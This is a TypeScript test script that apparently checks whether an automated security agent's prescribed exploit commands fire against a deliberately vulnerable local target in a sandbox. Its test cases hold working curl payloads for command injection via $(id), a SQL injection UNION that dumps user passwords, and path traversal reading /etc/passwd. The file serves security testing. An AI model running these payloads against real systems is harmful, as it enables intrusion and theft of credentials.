/**
 * Verify each prescribed exploit command actually fires on the vulnerable target.
 *
 * The directives tell the agent to run these lines verbatim, so they have to be
 * known-good rather than assumed: a wrong prescribed command makes the agent
 * confidently report the wrong thing.
 */
import 'dotenv/config';
import { runSandboxCommand } from '../src/sandbox/ephemeral.js';
import { detectTriggered } from '../src/scan/detectors.js';

const CASES = [
  {
    cls: 'command-injection',
    command: `curl -s -X POST -H 'Content-Type: application/json' -d '{"input":"$(id)"}' localhost:3000/convert`,
    signal: 'uid=0(root)',
  },
  {
    cls: 'sql-injection',
    command: `curl -s "localhost:3000/search?q=%27%20UNION%20SELECT%20id%2Cusername%2Cpassword%2Cemail%20FROM%20users--"`,
    signal: 'hunter2',
  },
  {
    cls: 'path-traversal',
    command: `curl -s "localhost:3000/files/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"`,
    signal: 'root:x:0:0',
  },
] as const;

let failed = 0;

for (const testCase of CASES) {
  const result = await runSandboxCommand({
    command: testCase.command,
    label: 'probe',
    timeoutMs: 60_000,
  });

  const output = `${result.stdout}\n${result.stderr}`;
  const detection = detectTriggered({
    vulnerabilityClass: testCase.cls,
    output,
    expectedSignal: testCase.signal,
  });
  const literalMatch = output.includes(testCase.signal);

  const ok = result.ready && detection.triggered && literalMatch;
  if (!ok) failed += 1;

  console.log(`\n===== ${testCase.cls} =====`);
  console.log(`command:   ${testCase.command}`);
  console.log(`ready:     ${result.ready}`);
  console.log(`signal:    "${testCase.signal}" literal=${literalMatch}`);
  console.log(`detector:  triggered=${detection.triggered} (${detection.confidence})`);
  console.log(`reasoning: ${detection.reasoning}`);
  console.log(`output:    ${result.stdout.trim().slice(0, 300)}`);
  console.log(`  ${ok ? 'PASS' : 'FAIL'}`);
}

console.log(failed === 0 ? '\n  ok  all prescribed commands fire' : `\n  ${failed} command(s) FAILED`);
if (failed > 0) process.exit(1);